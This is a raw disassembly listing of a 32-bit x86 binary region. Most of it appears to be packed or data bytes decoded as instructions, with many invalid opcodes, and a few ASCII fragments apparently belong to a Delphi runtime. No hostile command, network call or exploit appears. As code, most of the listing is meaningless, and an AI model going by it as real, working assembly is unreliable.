  41a18f:	(bad)  
  41a190:	(bad)  
  41a191:	fisttp WORD PTR [esi+0x67]
  41a194:	add    al,0xcd
  41a196:	leave  
  41a197:	repnz leave 
  41a199:	bound  eax,QWORD PTR [eax-0x6a]
  41a19c:	and    al,BYTE PTR [ecx+0x6f7c4045]
  41a1a2:	cld    
  41a1a3:	gs inc eax
  41a1a5:	sahf   
  41a1a6:	mov    ch,0x70
  41a1a8:	sub    ebp,DWORD PTR [eax+0x699dc5ad]
  41a1ae:	inc    eax
  41a1af:	aad    0xa6
  41a1b1:	(bad)  
  41a1b2:	(bad)  
  41a1b3:	jg     0x41a1b0
  41a1b5:	iret   
  41a1b6:	dec    DWORD PTR [ecx+0x1f]
  41a1b9:	js     0x41a16f
  41a1bb:	inc    eax
  41a1bc:	mov    ds:0x16c59b14,eax
  41a1c1:	stos   DWORD PTR es:[edi],eax
  41a1c2:	mov    bl,0xef
  41a1c4:	cmp    eax,0xe98ce041
  41a1c9:	or     cl,0x47
  41a1cc:	mov    edx,0xaa41a893
  41a1d1:	pop    ss
  41a1d2:	clc    
  41a1d3:	(bad)  
  41a1d4:	(bad)  
  41a1d5:	jmp    esi
  41a1d7:	jg     0x41a204
  41a1d9:	mov    eax,ds:0x4212b616
  41a1de:	imul   edx,DWORD PTR [ebp+0x27],0x39
  41a1e2:	(bad)  
  41a1e3:	div    DWORD PTR [eax-0x20]
  41a1e6:	jl     0x41a22a
  41a1e8:	xor    cl,cl
  41a1ea:	cmp    al,0xe3
  41a1ec:	call   DWORD PTR [esi+0x42e78a52]
  41a1f2:	mov    ?,edi
  41a1f4:	(bad)  
  41a1f5:	jmp    FWORD PTR [edi-0x140462b8]
  41a1fb:	jle    0x41a1a7
  41a1fd:	push   ecx
  41a1fe:	inc    ebx
  41a1ff:	mov    WORD PTR [edi],gs
  41a201:	push   0x5c
  41a203:	sbb    esp,edi
  41a205:	sar    BYTE PTR es:[ebx-0x331c89bd],cl
  41a20c:	repnz sub DWORD PTR [edi],ebp
  41a20f:	test   BYTE PTR [ecx-0x2dbbda],al
  41a215:	(bad)  
  41a216:	(bad)  
  41a217:	dec    DWORD PTR [edx]
  41a219:	nop
  41a21a:	fild   DWORD PTR [eax]
  41a21c:	daa    
  41a21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a21e:	lahf   
  41a21f:	nop
  41a220:	inc    esp
  41a221:	pop    ss
  41a222:	stos   BYTE PTR es:[edi],al
  41a223:	clc    
  41a224:	scas   al,BYTE PTR es:[edi]
  41a225:	adc    bl,ah
  41a227:	(bad)
  41a22a:	inc    esp
  41a22b:	pop    ecx
  41a22c:	pushf  
  41a22d:	mov    al,0xe9
  41a22f:	pop    es
  41a230:	pushf  
  41a231:	mov    dh,dl
  41a233:	fs inc ebp
  41a235:	aam    0xf3
  41a237:	idiv   edi
  41a239:	(bad)  
  41a23a:	(bad)  
  41a23b:	(bad)  
  41a23c:	jmp    0x41a21f
  41a23e:	dec    edx
  41a23f:	jp     0x41a1d6
  41a241:	iret   
  41a242:	inc    ebp
  41a243:	bound  esp,QWORD PTR [edx-0x2723f86b]
  41a249:	ds mov eax,0x91c74639
  41a24f:	push   cs
  41a250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a251:	scas   al,BYTE PTR es:[edi]
  41a252:	mov    al,ds:0x46a3e319
  41a257:	pop    ss
  41a258:	or     al,0x75
  41a25a:	add    DWORD PTR [esi-0x1],0x48c97675
  41a264:	dec    ebp
  41a265:	in     al,0xa7
  41a267:	xchg   ebx,eax
  41a268:	cmp    DWORD PTR [ebx],edi
  41a26a:	xor    eax,0x53edb2b8
  41a26f:	in     eax,0x5d
  41a271:	cmp    eax,0x8b3b5dc5
  41a276:	sahf   
  41a277:	xchg   edx,eax
  41a278:	pop    edx
  41a279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a27a:	lock mov eax,ds:0xa554c020
  41a280:	(bad)  
  41a281:	(bad)  
  41a282:	out    dx,eax
  41a283:	cli    
  41a284:	mov    WORD PTR [edi],?
  41a286:	popa   
  41a287:	mov    ebx,DWORD PTR [edx+0x44]
  41a28a:	and    eax,0xdbf9895d
  41a28f:	addr16 clc 
  41a291:	repz daa 
  41a293:	mov    edi,0xdd5dc8a2
  41a298:	sub    BYTE PTR [esi-0x65],0x97
  41a29c:	and    BYTE PTR [edx-0xa27c],cl
  41a2a2:	add    dl,BYTE PTR [edx+0x60]
  41a2a5:	les    esp,FWORD PTR ds:0xd559f075
  41a2ab:	outs   dx,BYTE PTR ds:[esi]
  41a2ac:	bound  edx,QWORD PTR [ecx]
  41a2ae:	xor    eax,0x3c7bcaae
  41a2b3:	and    eax,0xb8006f90
  41a2b8:	push   ds
  41a2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ba:	idiv   cl
  41a2bc:	and    BYTE PTR [ebx+eax*4],ah
  41a2bf:	clc    
  41a2c0:	add    esi,DWORD PTR [edx+edi*8]
  41a2c3:	sti    
  41a2c4:	pop    es
  41a2c5:	jne    0x41a2e3
  41a2c7:	push   0x1
  41a2c9:	pop    ss
  41a2ca:	and    eax,0xdf3ff00
  41a2cf:	mov    eax,0xa464ca18
  41a2d4:	pop    es
  41a2d5:	add    DWORD PTR [eax+ebp*4-0x55],edi
  41a2d9:	mov    bh,0xfe
  41a2db:	push   ebp
  41a2dc:	das    
  41a2dd:	hlt    
  41a2de:	movzx  eax,WORD PTR ds:0x8dbd5020
  41a2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2e6:	cs ss jae 0x41a2ec
  41a2ea:	push   0xc8f86884
  41a2ef:	push   0xbe68009a
  41a2f4:	adc    BYTE PTR [edx+0x76d4d1c],0x7c
  41a2fb:	bnd jbe 0x41a2cf
  41a2fe:	xor    bh,al
  41a300:	inc    ebp
  41a301:	hlt    
  41a302:	hlt    
  41a303:	pop    esi
  41a304:	hlt    
  41a305:	push   eax
  41a306:	ret    
  41a307:	lods   eax,DWORD PTR ds:[esi]
  41a308:	lahf   
  41a309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a30a:	data16 clc 
  41a30c:	add    BYTE PTR [ecx+esi*1],dl
  41a30f:	inc    eax
  41a310:	test   DWORD PTR [esp+eax*4],esp
  41a313:	imul   eax,DWORD PTR [edi+0x30d8b309],0x5c2142b
  41a31d:	jo     0x41a2ee
  41a31f:	lahf   
  41a320:	out    dx,eax
  41a321:	mov    ax,ds:0xffc0d6e1
  41a327:	data16 daa 
  41a329:	fsubr  QWORD PTR [edi-0x56]
  41a32c:	xor    al,0x66
  41a32e:	pop    edx
  41a32f:	aas    
  41a330:	or     ax,dx
  41a333:	mov    ds:0xffff6829,ax
  41a339:	jmp    DWORD PTR [esi]
  41a33b:	adc    dl,BYTE PTR [ebx+0x4f]
  41a33e:	inc    esi
  41a33f:	push   esp
  41a340:	push   edi
  41a341:	inc    ecx
  41a342:	push   edx
  41a343:	inc    ebp
  41a344:	pop    esp
  41a345:	inc    edx
  41a346:	outs   dx,DWORD PTR ds:[esi]
  41a347:	jb     0x41a3b5
  41a349:	popa   
  41a34a:	outs   dx,BYTE PTR ds:[esi]
  41a34b:	fs pop esp
  41a34d:	inc    esp
  41a34e:	gs ins BYTE PTR es:[edi],dx
  41a350:	jo     0x41a3ba
  41a352:	imul   ebx,DWORD PTR [esi+ebp*8+0x2b],0x5452ffff
  41a35a:	dec    esp
  41a35b:	add    BYTE PTR [esi+0x50],al
  41a35e:	push   ebp
  41a35f:	dec    ebp
  41a360:	popa   
  41a361:	jae    0x41a3ce
  41a363:	push   esi
  41a364:	popa   
  41a365:	ins    BYTE PTR es:[edi],dx
  41a366:	jne    0x41a3cd
  41a368:	fninit 
  41a36a:	fldcw  WORD PTR ds:0x41827873
  41a371:	push   edi
  41a372:	(bad)  
  41a373:	push   ecx
  41a374:	dec    esp
  41a375:	cmc    
  41a376:	notrack lock jmp DWORD PTR ds:0x8bd726b6
  41a37e:	jo     0x41a354
  41a380:	xor    ecx,ecx
  41a382:	mov    cl,BYTE PTR [esi]
  41a384:	inc    ecx
  41a385:	add    eax,DWORD PTR [edi+esi*8]
  41a388:	add    BYTE PTR [edi],cl
  41a38a:	adc    BYTE PTR [eax-0x24],al
  41a38d:	lock add cl,BYTE PTR [ebx+0x5b71db57]
  41a394:	inc    eax
  41a395:	inc    esi
  41a396:	cmp    DWORD PTR [ecx],esp
  41a398:	mov    BYTE PTR [eax],cl
  41a39a:	(bad)  
  41a39b:	mov    edx,eax
  41a39d:	sbb    eax,DWORD PTR [edi-0x3]
  41a3a0:	pop    esi
  41a3a1:	cmp    ecx,esp
  41a3a3:	pop    ebx
  41a3a4:	aaa    
  41a3a5:	and    ah,BYTE PTR [ecx*1-0x10f93fe7]
  41a3ac:	adc    ebp,eax
  41a3ae:	ffreep st(0)
  41a3b0:	fsubr  DWORD PTR [edi-0x7c]
  41a3b3:	shl    BYTE PTR [eax+ecx*1+0x50],cl
  41a3b7:	sub    al,0x24
  41a3b9:	adc    al,0x16
  41a3bb:	xorps  xmm1,XMMWORD PTR [eax]
  41a3be:	xor    DWORD PTR [edi+0x11],0x6c
  41a3c2:	pop    DWORD PTR fs:0x31c3e017
  41a3c9:	ret    
  41a3ca:	addr16 xchg ebp,eax
  41a3cc:	dec    ebp
  41a3cd:	jl     0x41a44d
  41a3cf:	add    eax,0x7e06e64
  41a3d4:	mov    dl,0xdc
  41a3d6:	clc    
  41a3d7:	add    BYTE PTR [edi],0x7c
  41a3da:	or     bh,bh
  41a3dc:	push   ecx
  41a3dd:	cld    
  41a3de:	ret    
  41a3df:	test   bl,0x2c
  41a3e2:	stos   DWORD PTR es:[edi],eax
  41a3e3:	mov    ecx,DWORD PTR [ebx-0x28]
  41a3e6:	xor    edx,ebx
  41a3e8:	pop    ebx
  41a3e9:	loopne 0x41a41a
  41a3eb:	pop    eax
  41a3ec:	shr    ecx,0x2
  41a3ef:	dec    ecx
  41a3f0:	rep stos DWORD PTR es:[edi],eax
  41a3f2:	pop    ecx
  41a3f3:	xor    DWORD PTR [ecx+0x2ae289d0],ecx
  41a3f9:	mov    eax,0x17416077
  41a3fe:	adc    al,0x1
  41a400:	mov    BYTE PTR [ebx-0x24],bl
  41a403:	je     0x41a409
  41a405:	mov    ebx,DWORD PTR [ebx]
  41a407:	pop    edi
  41a408:	sub    ebp,0x39edebff
  41a40e:	aam    0x74
  41a410:	sbb    eax,0x830b8b5b
  41a415:	ret    
  41a416:	sbb    dh,BYTE PTR [ebx+0x10]
  41a419:	inc    BYTE PTR [esi]
  41a41b:	mov    edi,DWORD PTR [ebx+0x14]
  41a41e:	mov    DWORD PTR [ebp+0x4],ebp
  41a421:	mov    esi,0x1e0734db
  41a426:	sbb    al,0x49
  41a428:	jne    0x41a462
  41a42a:	jne    0x41a40f
  41a42c:	aaa    
  41a42d:	(bad)  
  41a42e:	adc    al,0xd8
  41a430:	jmp    FWORD PTR [esi+eax*8+0x568b368b]
  41a437:	ror    BYTE PTR [ebx+0x72a7876],0x35
  41a43e:	cmp    BYTE PTR [ecx+0x5fc1f7d8],cl
  41a444:	pop    es
  41a445:	jp     0x41a430
  41a447:	inc    edx
  41a448:	xchg   ecx,edx
  41a44a:	cmp    ecx,0x1173ff3c
  41a450:	lsl    ebp,WORD PTR [esi]
  41a453:	test   al,0xfa
  41a455:	(bad)  
  41a456:	jb     0x41a45f
  41a458:	movd   DWORD PTR [ebx],mm0
  41a45b:	and    al,0x21
  41a45d:	jmp    ecx
  41a45f:	push   0x40b0585
  41a464:	and    BYTE PTR [ecx],al
  41a466:	rol    DWORD PTR [eax],0x8b
  41a469:	adc    DWORD PTR [ecx+0x25],esi
  41a46c:	sbb    al,0x2e
  41a46e:	dec    eax
  41a46f:	sbb    al,0x4f
  41a471:	pop    edi
  41a472:	push   edi
  41a473:	ror    DWORD PTR [eax],1
  41a475:	cmp    al,0xc8
  41a477:	sahf   
  41a478:	jp     0x41a453
  41a47a:	loop   0x41a46c
  41a47c:	mov    cl,0x2
  41a47e:	sub    ah,0x1
  41a481:	push   es
  41a482:	xor    eax,DWORD PTR [eax+0x392bc01d]
  41a488:	cmp    BYTE PTR [esi+0x4a971423],ah
  41a48e:	js     0x41a4aa
  41a490:	int3   
  41a491:	cmp    ah,al
  41a493:	adc    al,0x14
  41a495:	lods   al,BYTE PTR ds:[esi]
  41a496:	inc    eax
  41a497:	cmp    BYTE PTR [eax+0x1389d634],bh
  41a49d:	adc    ah,BYTE PTR [edx+ebp*2]
  41a4a0:	mov    esi,edx
  41a4a2:	lea    esi,[eax+0x1a44b17b]
  41a4a8:	lea    ecx,[ebp-0x8]
  41a4ab:	inc    ecx
  41a4ac:	push   eax
  41a4ad:	sbb    BYTE PTR [ecx+0xf602722],cl
  41a4b3:	mov    eax,DWORD PTR [esp+esi*8-0x43]
  41a4b7:	out    0x20,al
  41a4b9:	jecxz  0x41a449
  41a4bb:	mov    ds:0x74950f60,eax
  41a4c0:	fsubr  DWORD PTR [ebx+0xd]
  41a4c3:	shr    BYTE PTR [edi+ebx*4],1
  41a4c6:	adc    bl,ch
  41a4c8:	mov    al,0x39
  41a4ca:	add    al,0x9
  41a4cc:	lock mov eax,ebx
  41a4cf:	pop    edi
  41a4d0:	push   0x18
  41a4d2:	ficom  WORD PTR [ebx]
  41a4d4:	fisttp WORD PTR [ebx+0x29d0b843]
  41a4da:	mov    al,0x3c
  41a4dc:	dec    ebp
  41a4dd:	sti    
  41a4de:	stos   DWORD PTR es:[edi],eax
  41a4df:	icebp  
  41a4e0:	mov    esi,DWORD PTR [edx]
  41a4e2:	cmp    esi,DWORD PTR [eax]
  41a4e4:	mov    ah,0x72
  41a4e6:	add    al,0x3b
  41a4e8:	jo     0x41a4ee
  41a4ea:	jne    0x41a4fc
  41a4ec:	push   cs
  41a4ed:	or     BYTE PTR [eax],cl
  41a4ef:	rcl    DWORD PTR [esi],0x3
  41a4f2:	int    0x75
  41a4f4:	or     BYTE PTR [edx+ebp*2],cl
  41a4f7:	je     0x41a50c
  41a4f9:	inc    eax
  41a4fa:	test   BYTE PTR [ecx],bl
  41a4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4fd:	loope  0x41a559
  41a4ff:	fsubr  QWORD PTR [ebx+0x6290f6c5]
  41a505:	xor    al,0xe2
  41a507:	gs aaa 
  41a509:	and    al,0xd
  41a50b:	add    ebx,DWORD PTR es:[eax]
  41a50e:	pop    es
  41a50f:	ds and eax,0x78c423cc
  41a515:	ss mov al,0x1
  41a518:	scas   eax,DWORD PTR es:[edi]
  41a519:	push   ebx
  41a51a:	mov    bh,0x3e
  41a51c:	cld    
  41a51d:	push   edi
  41a51e:	xchg   esi,eax
  41a51f:	jmp    0x41a523
  41a521:	stos   BYTE PTR es:[edi],al
  41a522:	jle    0x41a4f4
  41a524:	or     BYTE PTR ds:0xf0e87f4c,0x7f
  41a52b:	sqrtps xmm0,XMMWORD PTR [ebx+0x66f202c7]
  41a532:	scas   eax,DWORD PTR es:[edi]
  41a533:	je     0x41a53f
  41a535:	pop    ecx
  41a536:	int    0xf6
  41a538:	cld    
  41a539:	ret    
  41a53a:	pop    eax
  41a53b:	add    eax,eax
  41a53d:	fmul   QWORD PTR [ebp-0x37d601f2]
  41a543:	mov    esi,DWORD PTR [edi+eax*2-0x4]
  41a547:	pop    edi
  41a548:	cs push eax
  41a54a:	add    BYTE PTR [ebx-0xea7a684],dl
  41a550:	mov    ebx,0xffca7707
  41a555:	out    0x59,al
  41a557:	jb     0x41a574
  41a559:	push   0x39008a2e
  41a55e:	rol    BYTE PTR [edi+0x6ec3fb8e],1
  41a564:	push   DWORD PTR [ebp-0xd]
  41a567:	mov    esi,0xb8ecb82e
  41a56c:	imul   ebx,DWORD PTR [eax-0x30c97f45],0x321c5607
  41a576:	or     WORD PTR [esi+0x51],dx
  41a57a:	and    al,0xac
  41a57c:	int3   
  41a57d:	pop    ss
  41a57e:	pop    sp
  41a580:	shl    dl,0x50
  41a583:	popf   
  41a584:	aas    
  41a585:	sub    dl,BYTE PTR [esi]
  41a587:	jecxz  0x41a5e1
  41a589:	fdiv   st,st(1)
  41a58b:	pop    esi
  41a58c:	pop    eax
  41a58d:	pop    esi
  41a58e:	mov    WORD PTR [ecx-0x10],fs
  41a591:	ror    BYTE PTR ds:0x52766e3b,0x51
  41a598:	push   ebx
  41a599:	ret    0x37c
  41a59c:	stos   BYTE PTR es:[edi],al
  41a59d:	hlt    
  41a59e:	xor    edx,edx
  41a5a0:	push   edi
  41a5a1:	loopne 0x41a5a2
  41a5a3:	xchg   edi,eax
  41a5a4:	add    BYTE PTR [ebx+ecx*4+0x1a],ah
  41a5a8:	mov    DWORD PTR [ecx],ebx
  41a5aa:	mov    DWORD PTR [ecx+0x8],ebp
  41a5ad:	mov    DWORD PTR [ecx+0x4],0x41892841
  41a5b4:	or     al,0xc6
  41a5b6:	push   cs
  41a5b7:	or     eax,0x560a880d
  41a5bc:	pop    edx
  41a5bd:	jne    0x41a5e4
  41a5bf:	jl     0x41a58e
  41a5c1:	sbb    DWORD PTR [ebx],0xffffffa8
  41a5c4:	test   BYTE PTR [esi+ecx*4],ch
  41a5c7:	pop    edx
  41a5c8:	push   cs
  41a5c9:	mov    dl,0xfa
  41a5cb:	rcl    cl,1
  41a5cd:	rol    DWORD PTR [ecx+0x39581250],1
  41a5d3:	xchg   esi,eax
  41a5d4:	or     BYTE PTR [edi+0x17],dl
  41a5d7:	mov    ds:0xff102f7f,al
  41a5dc:	push   edx
  41a5dd:	clc    
  41a5de:	out    dx,eax
  41a5df:	sbb    esp,esp
  41a5e1:	cmp    al,0xbb
  41a5e3:	push   ebx
  41a5e4:	loop   0x41a589
  41a5e6:	xlat   BYTE PTR ds:[ebx]
  41a5e7:	jg     0x41a5ea
  41a5e9:	fsub   DWORD PTR [ebx]
  41a5eb:	call   0x602ffe4a
  41a5f0:	pop    ecx
  41a5f1:	std    
  41a5f2:	je     0x41a574
  41a5f4:	cmp    eax,0x7601d024
  41a5f9:	adc    ecx,esp
  41a5fb:	in     al,0xdf
  41a5fd:	cli    
  41a5fe:	in     eax,dx
  41a5ff:	sti    
  41a600:	mov    ch,0x9
  41a602:	icebp  
  41a603:	push   cs
  41a604:	call   DWORD PTR ds:0xc4371014
  41a60a:	pop    ss
  41a60b:	push   eax
  41a60c:	pusha  
  41a60d:	outs   dx,BYTE PTR ds:[esi]
  41a60e:	(bad)  
  41a60f:	nop
  41a610:	ja     0x41a666
  41a612:	push   0x2
  41a614:	cmp    ah,ah
  41a616:	cwde   
  41a617:	or     BYTE PTR [eax-0x31],bl
  41a61a:	ins    BYTE PTR es:[edi],dx
  41a61b:	mov    ecx,0x12e69e4
  41a620:	loopne 0x41a626
  41a622:	scas   eax,DWORD PTR es:[edi]
  41a623:	jmp    esp
  41a625:	push   ds
  41a626:	cmp    al,0x7
  41a628:	push   eax
  41a629:	push   ebx
  41a62a:	bound  esp,QWORD PTR [esp+ecx*8]
  41a62d:	daa    
  41a62e:	adc    al,0x19
  41a630:	mov    eax,DWORD PTR [ecx+0x1]
  41a633:	and    BYTE PTR [eax],0xfa
  41a636:	push   esi
  41a638:	cmp    ecx,ebp
  41a63a:	je     0x41a648
  41a63c:	or     bl,ch
  41a63e:	jne    0x41a64c
  41a640:	movsx  eax,al
  41a643:	inc    ecx
  41a644:	inc    ecx
  41a645:	jmp    0x41a64a
  41a647:	add    ecx,0x5
  41a64a:	pop    edx
  41a64b:	(bad)  [edi+0x67366c31]
  41a651:	sbb    eax,0x51f82419
  41a656:	mov    ebx,0x90c70207
  41a65b:	loope  0x41a6b3
  41a65d:	adc    dl,BYTE PTR [bp+si+0x61]
  41a661:	add    DWORD PTR [ebx+0x66],0x3f
  41a665:	loop   0x41a6c1
  41a667:	mov    ah,0x3b
  41a669:	inc    eax
  41a66a:	aaa    
  41a66b:	ins    DWORD PTR es:[edi],dx
  41a66c:	adc    BYTE PTR [eax],0x65
  41a66f:	jecxz  0x41a6aa
  41a671:	pop    eax
  41a672:	mov    ch,0xf8
  41a675:	or     eax,edi
  41a677:	clc    
  41a678:	test   DWORD PTR [eax+0x4],0x13850f0c
  41a67f:	xor    al,0x81
  41a681:	fsubp  st(3),st
  41a683:	sbb    ebx,ebp
  41a685:	cmp    dh,bl
  41a687:	inc    edx
  41a688:	test   DWORD PTR [eax+0x14],ecx
  41a68b:	je     0x41a6fb
  41a68d:	cld    
  41a68e:	popa   
  41a68f:	and    BYTE PTR [ebx+0x74331015],cl
  41a695:	mov    edx,0xfd45ee8
  41a69a:	test   cl,dh
  41a69c:	(bad)  
  41a69d:	ror    dh,cl
  41a69f:	adc    ah,BYTE PTR [ebp-0x18b1f990]
  41a6a5:	sub    dl,ah
  41a6a7:	dec    edx
  41a6a8:	inc    ebx
  41a6a9:	cmp    edi,0xffffff81
  41a6ac:	cmp    esi,ecx
  41a6ae:	cli    
  41a6af:	out    dx,eax
  41a6b0:	push   cs
  41a6b1:	je     0x41a6ea
  41a6b3:	dec    ecx
  41a6b4:	test   al,0x4a
  41a6b6:	sub    al,ah
  41a6b8:	inc    eax
  41a6b9:	js     0x41a67e
  41a6bb:	jbe    0x41a6e6
  41a6bd:	pop    ebp
  41a6be:	ja     0x41a6e0
  41a6c0:	out    0x50,al
  41a6c2:	cmp    DWORD PTR [ebx-0x4c],eax
  41a6c5:	fild   WORD PTR [ebx-0x77c8bff]
  41a6cb:	add    BYTE PTR [eax+0x76],bl
  41a6ce:	stos   DWORD PTR es:[edi],eax
  41a6cf:	cmp    ebp,esi
  41a6d1:	cmp    DWORD PTR [ebx+ebx*1],0xffffffbb
  41a6d5:	enter  0xeb0c,0x30
  41a6d9:	adc    eax,0x1e760175
  41a6de:	adc    eax,0xd0a05610
  41a6e3:	push   eax
  41a6e4:	(bad)  
  41a6e5:	aam    0xfa
  41a6e7:	push   eax
  41a6e8:	jns    0x41a71a
  41a6ea:	dec    ecx
  41a6eb:	mov    BYTE PTR [edi-0x22],bh
  41a6ee:	je     0x41a760
  41a6f0:	or     DWORD PTR [eax+0x4],0x2
  41a6f4:	out    0xea,al
  41a6f6:	das    
  41a6f7:	cmp    BYTE PTR [eax],bh
  41a6f9:	in     al,dx
  41a6fa:	sub    bl,BYTE PTR [ebx]
  41a6fc:	push   ebx
  41a6fd:	cmp    BYTE PTR [esi],cl
  41a6ff:	sub    BYTE PTR [eax+edx*2-0x2ac9a798],dh
  41a706:	cmp    BYTE PTR ds:0xb852a80d,al
  41a70c:	sbb    BYTE PTR [esi],dl
  41a70e:	sub    BYTE PTR [eax-0x29],ch
  41a711:	fstp   QWORD PTR [ecx]
  41a713:	xchg   edi,edi
  41a715:	mov    al,0x0
  41a717:	(bad)  [eax+0x1f6f8b0b]
  41a71d:	shl    BYTE PTR [ebp-0x41],0x3e
  41a721:	pop    edi
  41a722:	add    al,0xc7
  41a724:	inc    edi
  41a725:	add    al,0x84
  41a727:	push   eax
  41a728:	ret    0xe47f
  41a72b:	(bad)  
  41a72c:	sti    
  41a72d:	sti    
  41a72e:	mov    WORD PTR [edi-0x7708041d],fs
  41a734:	dec    ebp
  41a735:	adc    DWORD PTR [ecx+0x586d0f90],ecx
  41a73b:	jecxz  0x41a734
  41a73d:	inc    ecx
  41a73e:	or     BYTE PTR [ecx+eiz*1],dh
  41a741:	sar    BYTE PTR [eax-0x48ca89e],0xd
  41a748:	and    ebx,DWORD PTR [esi]
  41a74a:	pop    edi
  41a74b:	je     0x41a76c
  41a74d:	mov    ecx,DWORD PTR [edx-0x68]
  41a750:	inc    edx
  41a751:	add    al,0xdc
  41a753:	mov    bh,0x10
  41a755:	jmp    0x728dabff
  41a75a:	mov    es,WORD PTR [edx]
  41a75c:	test   DWORD PTR ds:0xff1825f4,edi
  41a762:	shr    DWORD PTR [edx],1
  41a764:	outs   dx,DWORD PTR ds:[esi]
  41a765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a766:	(bad)  
  41a767:	push   DWORD PTR [ebx+eiz*8]
  41a76a:	or     bh,BYTE PTR [eax+0x5ae8d8d8]
  41a770:	push   esp
  41a771:	push   ebp
  41a772:	push   edi
  41a773:	push   esi
  41a774:	push   ebx
  41a775:	or     DWORD PTR [edx],0x1c
  41a778:	xchg   esp,eax
  41a779:	inc    edx
  41a77a:	pop    es
  41a77b:	fldenv es:[ebp+eiz*1-0x20]
  41a780:	inc    edx
  41a781:	sti    
  41a782:	sar    DWORD PTR ds:[esi+0x57b6c730],0xd4
  41a78a:	clc    
  41a78b:	adc    edi,DWORD PTR [esp+ecx*2-0x76f56fe5]
  41a792:	sub    eax,DWORD PTR [edx+0xc]
  41a795:	and    DWORD PTR [eax+0x4],0xfffffffd
  41a799:	add    al,0x27
  41a79b:	pop    ebp
  41a79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a79d:	aas    
  41a79e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a79f:	inc    edx
  41a7a0:	add    al,0x38
  41a7a2:	sbb    edi,DWORD PTR [edx]
  41a7a4:	push   esp
  41a7a5:	or     eax,0xcedc8c87
  41a7aa:	adc    al,0x18
  41a7ac:	adc    BYTE PTR [ecx-0x7e],bl
  41a7af:	dec    ebp
  41a7b0:	pop    ebx
  41a7b1:	add    bh,BYTE PTR [eax+0x34918df5]
  41a7b7:	cmp    cl,0xd9
  41a7ba:	jae    0x41a816
  41a7bc:	mov    esp,DWORD PTR [esp+0x2c]
  41a7c0:	sbb    bh,BYTE PTR [ebp+eax*4+0x5d74506f]
  41a7c7:	ins    DWORD PTR es:[edi],dx
  41a7c8:	inc    eax
  41a7c9:	jmp    edx
  41a7cb:	ret    
  41a7cc:	xor    ebp,ebx
  41a7ce:	jo     0x41a765
  41a7d0:	or     eax,0x3296d30c
  41a7d5:	(bad)  
  41a7d6:	rol    edx,1
  41a7d8:	or     al,0x71
  41a7da:	push   ebx
  41a7db:	dec    ebx
  41a7dc:	pusha  
  41a7dd:	xchg   DWORD PTR [edx+0x3d022eaa],edi
  41a7e3:	xchg   edx,eax
  41a7e4:	popf   
  41a7e5:	out    dx,eax
  41a7e6:	jle    0x41a7f9
  41a7e8:	xchg   esp,eax
  41a7e9:	jg     0x41a817
  41a7eb:	je     0x41a849
  41a7ed:	cmp    eax,0x7415118e
  41a7f2:	push   edi
  41a7f3:	sub    eax,0xeff55f05
  41a7f8:	mov    al,0x1e
  41a7fa:	sub    eax,0x483d2587
  41a7ff:	je     0x41a84f
  41a801:	jmp    0x41a863
  41a803:	add    eax,0x833ff271
  41a808:	call   0x95ad1a0f
  41a80d:	out    dx,eax
  41a80e:	(bad)  
  41a80f:	ss je  0x41a842
  41a812:	jmp    0x41a866
  41a814:	cmp    eax,0x74115396
  41a819:	cmp    eax,0x442e932d
  41a81e:	adc    eax,DWORD PTR [edi+edi*8]
  41a821:	call   esi
  41a823:	jge    0x41a849
  41a825:	jmp    0x41a861
  41a827:	sub    eax,0x4e2f1dfd
  41a82c:	cmp    eax,0x2ceb2674
  41a831:	mov    al,0xc8
  41a833:	jmp    0x41a85f
  41a835:	mov    al,0xc9
  41a837:	jmp    0x41a85f
  41a839:	mov    al,0xcd
  41a83b:	jmp    0x41a83c
  41a83d:	(bad)  
  41a83e:	(bad)  
  41a83f:	sti    
  41a840:	and    dh,BYTE PTR [eax+0x1e1eebcf]
  41a846:	sbb    dh,BYTE PTR [eax-0x4fe91429]
  41a84c:	into   
  41a84d:	jmp    0x41a861
  41a84f:	mov    al,0xd8
  41a851:	jmp    0x41a861
  41a853:	mov    al,0xda
  41a855:	jmp    0x41a861
  41a857:	mov    al,0xd9
  41a859:	jmp    0x41a861
  41a85b:	mov    al,0xca
  41a85d:	ss push 0x60fc0070
  41a863:	call   DWORD PTR [ecx+0x32200c52]
  41a869:	test   al,0x85
  41a86b:	jns    0x41a8ca
  41a86d:	jle    0x41a7fe
  41a86f:	ja     0x41a8a9
  41a871:	push   es
  41a872:	rcl    BYTE PTR [esi],0x85
  41a875:	jge    0x7bd30bad
  41a87b:	sbb    al,0x7f
  41a87d:	je     0x41a8f0
  41a87f:	push   ecx
  41a880:	stos   DWORD PTR es:[edi],eax
  41a881:	cmp    bl,BYTE PTR [edx+0x86aa564]
  41a887:	mov    ?,WORD PTR [eax]
  41a889:	pop    esp
  41a88a:	cwde   
  41a88b:	cmp    eax,DWORD PTR [edx]
  41a88d:	push   ebx
  41a88e:	hlt    
  41a88f:	jg     0x41a892
  41a891:	push   ebx
  41a892:	adc    al,0x8b
  41a894:	inc    ebx
  41a895:	sbb    BYTE PTR [ebp+ebx*1-0xb],dh
  41a899:	cli    
  41a89a:	cmp    edi,DWORD PTR [ebx-0x764b8977]
  41a8a0:	fdivr  st,st(1)
  41a8a2:	out    dx,al
  41a8a3:	push   ss
  41a8a4:	inc    edx
  41a8a5:	sti    
  41a8a6:	and    eax,0xac3a765c
  41a8ab:	out    dx,al
  41a8ac:	mov    ecx,DWORD PTR ds:0x56964204
  41a8b2:	sbb    DWORD PTR [eax-0x7e46f827],edi
  41a8b8:	or     eax,0xa145135
  41a8bd:	mov    ecx,0x403860b8
  41a8c2:	xor    edi,edi
  41a8c4:	scas   al,BYTE PTR es:[edi]
  41a8c5:	xchg   edx,eax
  41a8c6:	ja     0x41a929
  41a8c8:	cmp    BYTE PTR [edx+eax*2+0xa],dl
  41a8cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8cd:	fmul   st(0),st
  41a8cf:	dec    eax
  41a8d0:	call   0xface7695
  41a8d5:	mov    DWORD PTR [eax+0x8],ebp
